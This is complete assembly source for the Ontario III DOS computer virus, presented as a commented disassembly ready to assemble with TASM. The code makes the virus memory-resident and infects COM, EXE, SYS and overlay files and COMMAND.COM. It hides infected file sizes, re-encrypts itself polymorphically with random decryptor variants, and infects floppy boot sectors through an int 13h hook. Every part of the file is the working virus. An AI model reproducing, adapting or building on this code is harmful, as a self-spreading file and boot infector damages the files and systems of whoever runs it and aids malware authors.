                .model  tiny
                .code
; Ontario III
; Disassembly by Dark Angel of Phalcon/Skism
; Assemble with TASM /m ONTARIO3.ASM

; Virus written by Death Angel of YAM
                org     0

decrypt:
patch1:
                mov     di,offset endvirus      ; usually: offset enddecrypt
patch2          =       $ - 2
patch3          =       $
                mov     cx,37E5h
patch4          =       $ - 2
patch5:
                db      82h, 0C5h, 0D0h         ; add ch,0D0h
patch6          =       $ - 1
patch7:
                mov     al,0Ah
patch8          =       $ - 1

decrypt_loop:
                add     cs:[di],al
patch9          =       $ - 1
patch10:
                ror     al,cl
patch11         =       $ - 1
patch12:
                inc     di
patch13:
                loop    decrypt_loop
enddecrypt:

patch14:
                db      89h, 0FBh               ; mov bx,di
patch15         =       $ - 1

                sub     bx,offset save4
                xchg    ax,cx
                dec     ax
                cld
                call    saveorigvectors
                db      0e9h                    ; jmp
SYSpatch        dw      0                       ; currently jmp to next line
                int     21h                     ; installation check
                or      al,ah
                jz      restorefile
                push    ds
                mov     cx,bx
                mov     di,ds                   ; save current ds
                mov     ah,13h                  ; get BIOS int 13h handler
                int     2Fh                     ; to ds:dx and es:bx

                mov     si,ds                   ; does function function?
                cmp     si,di
                je      skipit
                push    ds
                push    dx
                mov     ah,13h                  ; restore handler
                int     2Fh


                mov     bx,cx                   ; but save its address too
                pop     word ptr cs:[bx+storeint13_1]
                pop     word ptr cs:[bx+storeint13_2]
skipit:
                xor     di,di
                mov     cx,es
                dec     cx
                mov     ds,cx                   ; get MCB of current program
                sub     word ptr [di+3],140h    ; decrease size by 5K
                mov     ax,[di+12h]             ; get high memory from PSP
                sub     ax,140h                 ; decrease size by 5K
                mov     [di+12h],ax             ; replace it
                mov     es,ax                   ; es->high memory segment
                sub     ax,1000h
                mov     word ptr cs:[bx+patchsegment],ax
                push    cs
                pop     ds
                mov     si,bx
                mov     cx,offset save4
                rep     movsb
                mov     ds,cx
                cli
                mov     word ptr ds:21h*4,offset int21 ; set int 21h handler
                mov     ds:21h*4+2,es           ; to virus's
                sti
                mov     ax,4BFFh                ; infect COMSPEC
                push    bx
                int     21h
                pop     bx
                pop     ds
                push    ds
                pop     es
restorefile:
                lea     si,[bx+offset save4]
                mov     di,100h
                cmp     bx,di
                jb      restoreEXE
                push    di
                movsw
                movsw
                retn
restoreEXE:
                mov     ax,es                   ; get start segment
                add     ax,10h                  ; adjust for PSP
                add     cs:[si+2],ax            ; relocate CS
                add     cs:[si+4],ax            ; relocate SS
                cli
                mov     sp,cs:[si+6]            ; restore stack
                mov     ss,cs:[si+4]
                sti
                jmp     dword ptr cs:[si]

int21instcheck:
                inc     ax
                iret

int21:
                cmp     ax,0FFFFh               ; installation check?
                je      int21instcheck
                cmp     ah,4Bh                  ; execute?
                je      execute
                cmp     ah,11h                  ; FCB find first?
                je      findfirstnext
                cmp     ah,12h                  ; FCB find next?
                je      findfirstnext
                cmp     ax,3D00h                ; open file read only?
                jne     int21exit
                call    handleopen
int21exit:
                db      0EAh                    ; jmp far ptr
oldint21        dd      0

findfirstnext:                                  ; standard stealth routine
                push    bp
                mov     bp,sp
                cmp     word ptr [bp+4],1234h
patchsegment    =       $ - 2
                pop     bp
                jb      int21exit
                call    callint21               ; do findfirst/next
                call    pushall
                mov     ah,2Fh                  ; Get DTA
                call    callint21
                cmp     byte ptr es:[bx],0FFh   ; extended FCB?
                je      findfirstnextnotextendedFCB
                sub     bx,7                    ; convert to standard
findfirstnextnotextendedFCB:
                mov     al,es:[bx+1Eh]          ; get seconds counter
                and     al,1Fh                  ; check if 62 seconds
                cmp     al,1Fh                  ; (infection marker)
                jne     findfirstnextexit       ; exit if not
                mov     dx,es:[bx+26h]          ; get file size
                mov     ax,es:[bx+24h]
                sub     ax,viruslength          ; decrease by virus
                sbb     dx,0                    ; size
                or      dx,dx
                jc      findfirstnextexit
                mov     es:[bx+26h],dx          ; replace file size
                mov     es:[bx+24h],ax          ; with "stealthed" one
findfirstnextexit:
                call    popall
                iret

execute:
                mov     byte ptr cs:infectSYS,0
                cmp     al,1                    ; load/don't execute
                je      load_noexecute
                cmp     al,0FFh                 ; called by virus
                je      infectCOMSPEC
                call    infectDSDX
                jmp     short int21exit

infectCOMMANDCOM:
                mov     byte ptr cs:infectSYS,0
                push    dx
                push    ds
                mov     dx,offset command_com
                push    cs
                pop     ds
                mov     byte ptr ds:infCOMMAND,0FFh ; infecting COMMAND.COM
                call    infectDSDX
                pop     ds
                pop     dx
                iret

infectCOMSPEC:
                mov     ah,51h                  ; Get current PSP
                call    callint21
                mov     es,bx
                mov     ds,es:[2Ch]             ; environment block
                xor     si,si
                push    cs
                pop     es
infectCOMSPECfindcomspec:
                mov     di,offset comspec       ; is 'COMSPEC=' the first
                mov     cx,4                    ; entry in environment?
                repe    cmpsw                   ; (should be)
                jcxz    infectCOMSPECnoenvironment ; otherwise, quit
infectCOMSPECfindend:
                lodsb                           ; search for end of string
                or      al,al
                jnz     infectCOMSPECfindend
                cmp     byte ptr [si],0         ; found it?
                jne     infectCOMSPECfindcomspec; nope, try again
                jmp     short infectCOMMANDCOM  ; otherwise, infect
infectCOMSPECnoenvironment:
                mov     dx,si
                mov     byte ptr cs:infCOMMAND,0FFh ; infecting COMMAND.COM
                call    infectDSDX              ; but are we really?  Maybe
                iret                            ; it's 4DOS.  This is a bug.
load_noexecute:
                push    es                      ; save parameter block
                push    bx
                call    callint21               ; prechain
                pop     bx
                pop     es
                call    pushall
                jnc     load_noexecute_ok       ; continue if no error
                jmp     load_noexecute_exit
load_noexecute_ok:
                xor     cx,cx
                lds     si,dword ptr es:[bx+12h]; get entry point on return
                push    ds
                push    si
                mov     di,100h
                cmp     si,di
                jl      loading_EXE
                ja      load_noexecute_quit
; debugger active
                lodsb
                cmp     al,0E9h                 ; check if infected
                jne     load_noexecute_quit
                lodsw
                push    ax                      ; save jmp location
                lodsb
                cmp     al,'O'                  ; check for infection marker
                pop     si                      ; get jmp location
                jnz     load_noexecute_quit
                add     si,103h                 ; convert to file offset
                inc     cx
                inc     cx
                pop     ax
                push    si
                push    ds
                pop     es
                jmp     short check_infection
loading_EXE:
                lea     di,[bx+0Eh]             ; check SS:SP on return
                cmp     word ptr es:[di],9FFh   ; infected?
                jne     load_noexecute_quit
check_infection:
                lodsb
                cmp     al,0BBh                 ; possibility 1
                je      infected_checked1
                cmp     al,0BEh                 ; possibility 2
                je      infected_checked1
                cmp     al,0BFh                 ; possibility 3
                jne     load_noexecute_quit
infected_checked1:
                lodsw                           ; get starting offset
                push    ax                      ; to decrypt
                lodsb                           ; get next byte
                cmp     al,0B9h                 ; check for infection
                lodsw
                pop     si                      ; offset to decrypt
                jnz     load_noexecute_quit
                cmp     ah,7                    ; check if infected
                je      infected_checked2
                cmp     al,0E5h                 ; ditto
                jne     load_noexecute_quit
infected_checked2:
                add     si,save4 - enddecrypt
                jcxz    disinfectEXE
                rep     movsw
                jmp     short finish_disinfection
disinfectEXE:
                mov     ah,51h                  ; Get current PSP
                call    callint21
                add     bx,10h                  ; go to file starting CS
                mov     ax,[si+6]
                dec     ax
                dec     ax
                stosw
                mov     ax,[si+4]
                add     ax,bx
                stosw
                movsw
                lodsw
                add     ax,bx
                stosw
finish_disinfection:
                pop     di
                pop     es
                xchg    ax,cx
                mov     cx,viruslength
                rep     stosb
                jmp     short load_noexecute_exit
load_noexecute_quit:
                pop     ax
                pop     ax
load_noexecute_exit:
                call    popall
                retf    2


handleopen:
                call    pushall
                mov     si,dx                   ; find extension of
handleopenscanloop:                             ; ASCIIZ string
                lodsb
                or      al,al                   ; found end of screen?
                jz      handleopenexit          ; yup, no extension -- exit
                cmp     al,'.'                  ; extension found?
                jne     handleopenscanloop
                mov     di,offset validextensions - 3
                push    cs
                pop     es
                mov     cx,4
                nop

scanvalidextension:
                push    cx
                push    si
                mov     cl,3
                add     di,cx
                push    di

check_extension:
                lodsb
                and     al,5Fh                  ; Capitalise
                cmp     al,es:[di]              ; do they compare ok?
                jne     extension_no_match      ; nope, try next one
                inc     di
                loop    check_extension

                cmp     al,'S'                  ; SYS file?
                jne     opennotSYS
                mov     byte ptr cs:infectSYS,0FFh ; infecting SYS file
opennotSYS:
                call    infectDSDX
                add     sp,6
                jmp     short handleopenexit
extension_no_match:
                pop     di
                pop     si
                pop     cx
                loop    scanvalidextension

handleopenexit:
                call    popall
                retn

infectDSDX:
                call    pushall
                call    replaceint13and24
                push    dx
                push    ds
                mov     ax,4300h                ; get attributes
                call    callint21
                push    cx
                pushf
                jc      go_restoreattribs
                push    cx
                and     cl,1                    ; check if read only
                cmp     cl,1
                jne     infectDSDXnoclearattributes
                xor     cx,cx                   ; clear if so
                mov     ax,4301h
                call    callint21
infectDSDXnoclearattributes:
                pop     cx
                and     cl,4
                cmp     cl,4
                je      go_restoreattribs
                mov     ax,3D02h                ; open file read/write
                call    callint21
                jnc     infectDSDXopenOK        ; continue if no error
go_restoreattribs:
                jmp     infectDSDXrestoreattributes
infectDSDXopenOK:
                xchg    ax,bx                   ; handle to bx
                push    cs
                push    cs
                pop     ds
                pop     es
                mov     word ptr ds:SYSpatch,0
                mov     ax,5700h                ; save file time/date
                call    callint21
                push    dx
                push    cx
                and     cl,1Fh                  ; check if infected
                cmp     cl,1Fh                  ; (seconds == 62)
                je      infectDSDXerror
                mov     dx,offset readbuffer    ; read header from
                mov     cx,1Ch                  ; potential carrier
                mov     ah,3Fh                  ; file to the
                call    callint21               ; buffer
                jnc     infectDSDXreadOK        ; continue if no error
infectDSDXerror:
                stc                             ; mark error
                jmp     infectDSDXclose         ; and exit
infectDSDXreadOK:
                cmp     ax,cx                   ; read 1ch bytes?
                jne     infectDSDXerror         ; exit if not
                xor     dx,dx
                mov     cx,dx
                mov     ax,4202h                ; go to end of file
                call    callint21
                or      dx,dx
                jnz     infectDSDXfilelargeenough
                cmp     ax,0A01h                ; check if too small
                jb      infectDSDXerror
infectDSDXfilelargeenough:
                cmp     dl,5
                ja      infectDSDXerror
                cmp     word ptr ds:readbuffer,'ZM'     ; EXE?
                je      infectDSDXskipcheck
                cmp     word ptr ds:readbuffer,'MZ'     ; EXE?
infectDSDXskipcheck:
                je      infectDSDXcheckEXE
                cmp     byte ptr ds:infectSYS,0FFh      ; infecting SYS file?
                jne     infectDSDXcheckCOM
                cmp     word ptr ds:readbuffer,0FFFFh   ; check if SYS
                jne     infectDSDXerror                 ; file
                cmp     word ptr ds:readbuffer+2,0FFFFh
isanoverlay:
                jne     infectDSDXerror
                or      dx,dx
                jnz     infectDSDXerror
                push    ax                      ; save file size
                mov     di,offset save4
                mov     ax,5657h                ; push di, push si
                stosw
                mov     ax,0E953h               ; push bx, jmp decrypt
                stosw
                mov     ax,offset decrypt - (offset save4 + 6)
                stosw
                mov     ax,word ptr ds:readbuffer+6 ; get strategy start point
                stosw
                pop     ax                      ; get file size
                push    ax
                add     ax,offset save4
                mov     word ptr ds:readbuffer+6,ax
                mov     word ptr ds:SYSpatch,offset strategy-(offset SYSpatch + 2)
                mov     byte ptr ds:decrypt_loop,36h    ; replace with SS:
                pop     ax
                add     ax,offset enddecrypt
                jmp     short go_infectDSDXcontinue
infectDSDXcheckCOM:
                cmp     byte ptr ds:readbuffer+3,'O'; check if already infected
jmp_infectDSDXerror:
                je      infectDSDXerror
                cmp     byte ptr ds:infCOMMAND,0; infecting COMMAND.COM?
                je      dontdoslackspace
                sub     ax,viruslength          ; infect slack space of
                xchg    ax,dx                   ; command.com
                xor     cx,cx
                mov     ax,4200h
                call    callint21
dontdoslackspace:
                mov     si,offset readbuffer
                mov     di,offset save4
                movsw
                movsw
                sub     ax,3                         ; convert size->jmp dest
                mov     byte ptr ds:readbuffer,0E9h  ; encode JMP
                mov     word ptr ds:readbuffer+1,ax  ; and destination
                mov     byte ptr ds:readbuffer+3,'O' ; mark infected
                add     ax,116h
go_infectDSDXcontinue:
                jmp     short infectDSDXcontinue
infectDSDXcheckEXE:
                cmp     word ptr ds:readbuffer+10h,0A01h ; already infected?
                je      jmp_infectDSDXerror
                cmp     word ptr ds:readbuffer+1Ah,0
                jne     isanoverlay             ; exit if it's an overlay

                push    dx
                push    ax
                mov     cl,4
                ror     dx,cl
                shr     ax,cl
                add     ax,dx                           ; ax:dx = file size
                sub     ax,word ptr ds:readbuffer+8     ; subtract header size
                mov     si,offset readbuffer+14h
                mov     di,offset origCSIP
                movsw                           ; save initial CS:IP
                movsw
                mov     si,offset readbuffer+0Eh
                movsw                           ; save initial SS:SP
                movsw
                mov     word ptr ds:readbuffer+16h,ax    ; set initial CS
                mov     word ptr ds:readbuffer+0Eh,ax    ; set initial SS
                mov     word ptr ds:readbuffer+10h,0A01h ; set initial SP
                pop     ax
                pop     dx
                push    ax
                add     ax,0A01h

                ; adc dx,0 works just as well
                jnc     infectEXEnocarry
                inc     dx
infectEXEnocarry:
                mov     cx,200h                 ; take image size
                div     cx
                ; The next line is not entirely corrrect.  The image size
                ; div 512 is rounded up.  Therefore, DOS will find this number
                ; to be off by 512d bytes
                mov     word ptr ds:readbuffer+4,ax     ; image size div 512
                mov     word ptr ds:readbuffer+2,dx     ; image size mod 512
                pop     ax
                and     ax,0Fh
                mov     word ptr ds:readbuffer+14h,ax   ; set initial IP
                add     ax,offset enddecrypt
infectDSDXcontinue:
                mov     word ptr ds:patch2,ax   ; patch start area
                push    bx                      ; save file handle
                xor     byte ptr ds:decrypt_loop,18h    ; swap SS: & CS:
                call    encrypt                 ; encrypt virus to buffer
                pop     bx                      ; restore file handle
                mov     ah,40h                  ; Concatenate encrypted
                call    callint21               ; virus
                jc      infectDSDXclose         ; exit on error
                xor     dx,dx
                mov     cx,dx
                mov     ax,4200h                ; go to start of file
                call    callint21
                jc      infectDSDXclose
                mov     dx,offset readbuffer
                mov     cx,1Ch
                mov     ah,40h                  ; Write new header
                call    callint21
infectDSDXclose:
                pop     cx
                pop     dx
                jc      infectDSDXnoaltertime
                cmp     byte ptr ds:infCOMMAND,0FFh ; infecting COMMAND.COM?
                je      infectDSDXnoaltertime
                or      cl,1Fh                  ; set time to 62 seconds
infectDSDXnoaltertime:
                mov     ax,5701h                ; restore file time/date
                call    callint21
                mov     ah,3Eh                  ; Close file
                call    callint21
infectDSDXrestoreattributes:
                mov     byte ptr cs:infCOMMAND,0
                mov     byte ptr cs:infectSYS,0
                popf
                pop     cx
                pop     ds
                pop     dx
                jc      infectDSDXexit
                mov     ax,4301h                ; restore file attributes
                call    callint21
infectDSDXexit:
                call    restoreint13and24
                call    popall
                retn

pushall:
                push    bp
                mov     bp,sp
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                pushf
                xchg    ax,[bp+2]
                push    ax
                mov     ax,[bp+2]
                retn

popall:
                pop     ax
                xchg    ax,[bp+2]
                popf
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     bp
                retn

replaceint13and24:
                push    ds
                xor     ax,ax
                mov     ds,ax
                mov     si,13h*4
                lodsw
                mov     word ptr cs:origint13_1,ax
                lodsw
                mov     word ptr cs:origint13_2,ax
                mov     si,24h*4
                lodsw
                mov     word ptr cs:origint24_1,ax
                lodsw
                mov     word ptr cs:origint24_2,ax
                mov     word ptr ds:13h*4,1234h
storeint13_1    =       $ - 2
                mov     word ptr ds:13h*4+2,1234h
storeint13_2    =       $ - 2
                mov     word ptr ds:24h*4,offset int24 ; replace int 24 handler
                mov     ds:24h*4+2,cs
                pop     ds
                retn

restoreint13and24:
                xor     ax,ax
                mov     ds,ax
                mov     word ptr ds:13h*4,1234h
origint13_1     =       $ - 2
                mov     word ptr ds:13h*4+2,1234h
origint13_2     =       $ - 2
                mov     word ptr ds:24h*4,1234h
origint24_1     =       $ - 2
                mov     word ptr ds:24h*4+2,1234h
origint24_2     =       $ - 2
                retn

int24:
                xor     al,al
                iret

encrypt:
                mov     di,offset patch4
                mov     si,di
                mov     word ptr [si],offset save4 - offset enddecrypt
                xor     bx,bx
                call    random
                jz      encrypt1
                add     bl,4
                inc     di
encrypt1:
                call    random
                in      al,40h                  ; get random #
                mov     bh,al
                jz      encrypt2
                add     [di],al                 ; alter amount to encrypt
                add     bl,28h
                jmp     short encrypt3
encrypt2:
                sub     [di],al                 ; alter amount to encrypt
encrypt3:
                add     bl,0C1h
                mov     [si+3],bx
                call    random
                jz      encrypt4
                xor     byte ptr [si+2],2       ; flip betwen add/sub
encrypt4:
                in      ax,40h                  ; get random number != 0
                or      ax,ax
                jz      encrypt4
                mov     bx,3                    ; first choose one of
                xor     dx,dx                   ; three possible registers
                div     bx
                xchg    ax,bx
                inc     ax                      ; ax = 4
                mul     dx                      ; convert to offset in
                xchg    ax,bx                   ; table
                lea     si,[bx+offset table1]
                lodsb
                mov     byte ptr ds:patch1,al
                lodsb
                mov     byte ptr ds:patch9,al
                lodsb
                mov     byte ptr ds:patch12,al
                lodsb
                mov     byte ptr ds:patch15,al
                call    random
                jz      encrypt5
                xor     byte ptr ds:patch13,2 ; loop/loopnz
encrypt5:
                in      ax,40h                  ; get random number
                mov     byte ptr ds:patch8,ah
                and     ax,0Fh
                xchg    ax,bx
                shl     bx,1
                mov     ax,[bx+offset table2]
                mov     word ptr ds:patch10,ax
                xor     si,si
                mov     di,offset encryptbuffer ; copy virus to
                mov     cx,endvirus - decrypt   ; temporary buffer
                push    cx                      ; for encryption
                cld
                rep     movsb
                mov     bx,offset enddecrypt
                push    word ptr [bx]           ; save it
                mov     byte ptr [bx],0C3h      ; put retn in its place
                push    bx
                xor     byte ptr [bx-7],28h     ; sub/add
                push    word ptr ds:decrypt_loop
                mov     byte ptr [bx-8],2Eh     ; CS:
                mov     dx,offset encryptbuffer
                add     bx,dx
                mov     word ptr ds:patch2,bx
                call    decrypt
                pop     word ptr ds:decrypt_loop
                pop     bx
                pop     word ptr [bx]
                pop     cx
                retn


random: ; 1/2 chance of zero flag set
                in      al,40h
                and     al,1
                cmp     al,1
                retn


saveorigvectors:
                push    ds
                push    ax
                xor     ax,ax
                mov     ds,ax
                mov     ax,ds:13h*4
                mov     word ptr cs:[bx+storeint13_1],ax
                mov     ax,ds:13h*4+2
                mov     word ptr cs:[bx+storeint13_2],ax
                mov     ax,ds:21h*4
                mov     word ptr cs:[bx+offset oldint21],ax
                mov     ax,ds:21h*4+2
                mov     word ptr cs:[bx+offset oldint21+2],ax
                pop     ax
                pop     ds
                retn

strategy:
                mov     word ptr cs:[bx+doffset],bx ; save delta offset
                pop     bx
                pop     di
                pop     si
                call    pushall
                push    cs
                pop     ds
                mov     bx,1234h                ; restore delta offset
doffset         =       $ - 2
                db      8bh, 87h                ; mov ax,ds:[save4+6]
                dw      offset save4 + 6        ; get old strategy entry point
                mov     word ptr ds:[6],ax      ; and restore to file header
                int     12h                     ; Get memory size in K
                sub     ax,5                    ; decrease by 5 K
                mov     cl,6                    ; convert to paragraphs
                shl     ax,cl
                mov     es,ax
                mov     word ptr ds:[bx+himemsegment],ax
                cmp     byte ptr es:[3],0B9h    ; check if already installed
                je      strategyexit
                mov     si,bx                   ; copy to high memory
                xor     di,di
                mov     cx,viruslength
                rep     movsb
                pushf
                db      09Ah    ; call far ptr
                dw      infectCOMMANDCOM
himemsegment    dw      0

strategyexit:
                call    popall
                jmp     word ptr cs:[6]         ; go to original strategy

table1          db      0BEh, 04h, 46h,0F3h ; si
                db      0BFh, 05h, 47h,0FBh ; di
                db      0BBh, 07h, 43h,0DBh ; bx

table2:         inc     al
                dec     al
                inc     ax
                inc     ax
                dec     ax
                dec     ax
                add     al,cl
                sub     al,cl
                xor     al,cl
                xor     al,ch
                not     al
                neg     al
                ror     al,1
                rol     al,1
                ror     al,cl
                rol     al,cl
                nop
                nop
                add     al,ch

comspec         db      'COMSPEC='
command_com     db      '\COMMAND.COM',0

validextensions db      'COMEXEOVLSYS'

bootsector:     ; offset 600h in the virus
                jmp     short bootsectorentry
                nop
bootparms       db      3Bh dup (0)

bootsectorentry:
                xor     ax,ax
                mov     ds,ax
                cli
                mov     ss,ax
                mov     sp,7C00h
                sti
                mov     ax,ds:13h*4             ; get int 13h handler
                mov     word ptr ds:[7C00h+oldint13-bootsector],ax
                mov     ax,ds:13h*4+2           ; and save it
                mov     word ptr ds:[7C00h+oldint13+2-bootsector],ax
                mov     ax,ds:[413h]            ; get total memory
                sub     ax,2                    ; reduce by 2K
                mov     ds:[413h],ax            ; replace memory size
                mov     cl,6
                shl     ax,cl                   ; convert to paragraphs
                sub     ax,60h                  ; go to boot block start
                mov     es,ax
                mov     si,sp
                mov     di,offset bootsector
                mov     cx,100h
                rep     movsw
                mov     dx,offset highentry
                push    es
                push    dx
                retf
highentry:
                xor     ax,ax                   ; reset disk
                and     dl,al
                int     13h
                push    ds
                push    es
                pop     ds
                pop     es
                mov     bx,sp                   ; read to 0:7C00h
                mov     dx,drivehead            ; find where original boot
                mov     cx,sectortrack          ; block stored and then
                mov     ax,201h                 ; read original boot
                int     13h                     ; sector
                jc      $                       ; halt on error
                xor     ax,ax                   ; else chain to original
                mov     ds,ax                   ; boot sector
                mov     word ptr ds:13h*4,offset int13
                mov     ds:13h*4+2,cs           ; replace int 13h handler
                push    es
                push    bx
                retf

int13:
                push    bp
                mov     bp,sp
                push    ds
                push    es
                push    si
                push    di
                push    dx
                push    cx
                push    bx
                push    ax
                pushf
                xor     bx,bx
                mov     ds,bx
                test    byte ptr ds:[43Fh],1    ; A: spinning?
                jnz     exitint13               ; exit if so
                or      dl,dl                   ; default drive?
                jnz     exitint13               ; exit if not
                cmp     ah,2                    ; read/write/verify?
                jb      exitint13
                cmp     ah,4
                jbe     trapint13
exitint13:
                popf
                pop     ax
                pop     bx
                pop     cx
                pop     dx
                pop     di
                pop     si
                pop     es
                pop     ds
                pop     bp
                jmp     dword ptr cs:oldint13   ; chain to original handler

trapint13:
                cld
                push    cs
                push    cs
                pop     es
                pop     ds
                xor     cx,cx
                mov     dx,cx
                inc     cx
                mov     bx,offset endvirus      ; read boot block to
                mov     ax,201h                 ; buffer at endvirus
                call    callint13
                jnc     int13readOK
int13exit:
                jmp     short exitint13
int13readOK:
                cmp     word ptr [bx+15h],501Eh ; push ds, push ax?
                jne     int13skip
                cmp     word ptr [bx+35h],0FF2Eh; jmp cs: ?
                jne     int13skip
                cmp     word ptr [bx+70h],7505h ; add ax,XX75 ?
                jne     int13skip
                mov     dh,1
                mov     cl,3
                mov     ax,201h
                call    callint13
                xor     dh,dh
                mov     cl,1
                mov     ax,301h
                call    callint13
int13skip:
                cmp     word ptr ds:[offset endvirus-bootsector+YAM],'Y*'
                je      int13exit               ; don't infect self
                cmp     word ptr ds:[offset endvirus+0Bh],200h
                jne     int13exit               ; infect only 512 bytes per sector
                cmp     byte ptr ds:[offset endvirus+0Dh],2
                jne     int13exit               ; only 2 reserved sectors
                cmp     word ptr ds:[offset endvirus+1Ah],2
                ja      int13exit               ; only 2 sec/track
                xor     dx,dx   ; calculate new location of boot block
                mov     ax,word ptr ds:[offset endvirus+13h] ; total sec
                mov     bx,word ptr ds:[offset endvirus+1Ah] ; sec/track
                mov     cx,bx
                div     bx                      ; # track
                xor     dx,dx
                mov     bx,word ptr ds:[offset endvirus+18h] ; sec/FAT
                div     bx
                sub     word ptr ds:[offset endvirus+13h],cx ; total sec
                dec     ax
                mov     byte ptr sectortrack+1,al
                mov     ax,word ptr ds:[offset endvirus+18h] ; sec/FAT
                mov     byte ptr sectortrack,al
                mov     ax,word ptr ds:[offset endvirus+1Ah] ; sec/track
                dec     ax
                mov     byte ptr drivehead+1,al
                mov     byte ptr drivehead,0
                mov     dx,drivehead            ; move original boot block
                mov     cx,sectortrack          ; to end of disk
                mov     bx,offset endvirus
                mov     ax,301h
                call    callint13
                jc      go_exitint13
                mov     si,offset endvirus+3    ; copy parameters so
                mov     di,offset bootparms     ; no one notices boot
                mov     cx,bootsectorentry - bootparms ; block is changed
                rep     movsb
                xor     cx,cx
                mov     dx,cx
                inc     cx
                mov     bx,offset bootsector    ; copy virus boot block
                mov     ax,301h
                call    callint13
go_exitint13:
                jmp     exitint13

callint21:
                pushf
                call    dword ptr cs:oldint21
                retn

callint13:
                pushf
                call    dword ptr cs:oldint13
                retn

oldint13        dd      0
drivehead       dw      100h
sectortrack     dw      2709h
YAM             db      '*YAM*',1Ah
                db      'Your PC has a bootache! - Get some medicine!',1Ah
                db      'Ontario-3 by Death Angel',1Ah,1Ah,1Ah,1Ah
save4:
origCSIP        db      0CDh, 020h, 0, 0
origSSSP        dd      0

endvirus:

viruslength     =       $ - decrypt

infCOMMAND      db      ?
infectSYS       db      ?
readbuffer      db      01Ch dup (?)
encryptbuffer   db      viruslength dup (?)

                end     decrypt
